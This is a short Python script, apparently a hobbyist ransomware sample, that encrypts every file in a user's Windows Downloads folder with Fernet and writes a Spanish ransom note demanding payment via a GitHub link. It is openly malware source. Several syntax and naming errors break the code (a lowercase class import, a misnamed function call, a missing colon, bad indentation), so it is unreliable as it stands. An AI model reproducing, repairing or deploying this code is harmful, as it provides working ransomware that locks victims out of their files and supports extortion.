from cryptography.fernet import fernet
import os

def generador_key():
    key = fernet.generate_key()
    with open('key.key', 'wb') as key_file:
    key_file.write(key)

def retornar_key():
    return open("key.key", 'rb').read()

def encrypt(items,key):
    i = fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        data = i.encrypt(file_data)

        with open(item, 'wb') as file:
            file.write(data)

if __name__ == '__main__':
    path = "C:\\User\\JuanPerezMaldonado\\Downloads"
    items = os.listdir(path)
    archivos =[path+"\\"+x for x in items]

genera_key()
key = retornar_key()

encrypt(archivos, key)

with open(path+"\\"+"readme.txt", 'w') as file
     file.write("FUE INFECTADO POR CHINOBETOSKA_RAMSWARE \n")
     file.write("LOS ARCHIVOS HAN SIDO ENCRIPTADOS Y INFECTADOS POR UN DIOS, \n")
     file.write("XD \n")
     file.write("PAGUE PARA VOLVER A VERLOS EN SU FORMA BASE \n")
     file.write("Entre a para pagar su rescate https://github.com/chinobetoska/ramsware.git \n")